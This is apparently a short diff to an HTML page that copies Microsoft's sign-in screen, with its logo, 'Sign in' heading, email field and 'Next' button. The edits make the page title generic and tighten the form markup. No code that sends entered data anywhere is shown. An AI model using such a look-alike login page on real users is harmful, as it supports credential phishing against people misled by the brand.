@@ -3,11 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="assets/favicon.ico" />
-    <title>Sign in to your Microsoft account</title>
-    <link rel="stylesheet" href="assets/app.css" />
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="style.css" />
 </head>
 
 <body>
@@ -15,10 +13,10 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <form id="login_form">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    <input id="inp_uname" type="email" name="uname" class="input" placeholder="Email" required/>
                 </div>
             </form>
             <div>
@@ -30,7 +28,7 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_next">Next</button>
+                <button type="button" class="btn" id="btn_next">Next</button>
             </div>
         </div>
         <div class="opts">
